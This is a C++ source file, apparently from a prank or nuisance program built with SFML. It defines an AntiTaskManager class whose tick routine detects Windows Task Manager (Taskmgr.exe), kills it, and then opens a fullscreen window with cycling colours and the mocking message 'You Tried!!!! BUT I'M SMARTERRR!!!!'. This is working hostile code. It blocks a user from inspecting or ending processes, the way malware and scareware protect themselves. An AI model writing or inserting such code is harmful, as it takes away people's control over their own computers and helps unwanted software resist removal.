#include "AntiTaskManager.h"

#include "WindowManager.h"
#include "../Timings/Timeline.h"
#include "../WidgetBase/TextWidget.h"

AntiTaskManager::AntiTaskManager()
{
    
}

AntiTaskManager::~AntiTaskManager()
{
    
}

void AntiTaskManager::tick(const double delta_time)
{
    const std::wstring task_name = L"Taskmgr.exe";
    if (!ExternalProcessHandler::is_process_running(task_name))
        return;

    ExternalProcessHandler::terminate_process(task_name);

    const auto wm = new WindowManager(sf::VideoMode::getDesktopMode(), "Womp Womp :(", sf::Style::Fullscreen);
    wm->background_color = sf::Color::Black;

    auto ctl = new ColorTimeline(this, {
    {.0, sf::Color::Red},         //!< Red predefined color
    {.2, sf::Color::Green},       //!< Green predefined color
    {.4, sf::Color::Blue},        //!< Blue predefined color
    {.6, sf::Color::Yellow},      //!< Yellow predefined color
    {.8, sf::Color::Magenta},     //!< Magenta predefined color
    {1., sf::Color::Cyan},  
    });
        

    ctl->bind_property(wm->background_color);
    ctl->play(TimelinePlayType::PingPong);

    const auto txt = new TextWidget;
    txt->setString("You Tried!!!! BUT I'M SMARTERRR!!!!");
    txt->setFillColor(sf::Color::White);
    txt->setOutlineColor(sf::Color::Black);
    txt->setOutlineThickness(1);
    txt->setCharacterSize(24);
    centre_drawable(txt);
    txt->local_transform.translate({static_cast<float>(wm->getSize().x) / 2.f, static_cast<float>(wm->getSize().y) / 2.f});
    txt->add_to_parent(wm);
    
    std::vector<TimelinePoint<sf::Transform>> transforms;
    sf::Transform t = txt->local_transform;
    t.rotate(-45.f);
    t.scale(0.5f, 0.5f);
    transforms.emplace_back(0, t);
    t.rotate(45.f);
    t.scale(4.f, 4.f);
    transforms.emplace_back(.5, t);
    t.rotate(45.f);
    t.scale(.5f, .5f);
    transforms.emplace_back(1., t);
    
    auto ttl = new TransformTimeline(this, transforms);
    ttl->bind_property(txt->local_transform);
    ttl->play(TimelinePlayType::PingPong);
}
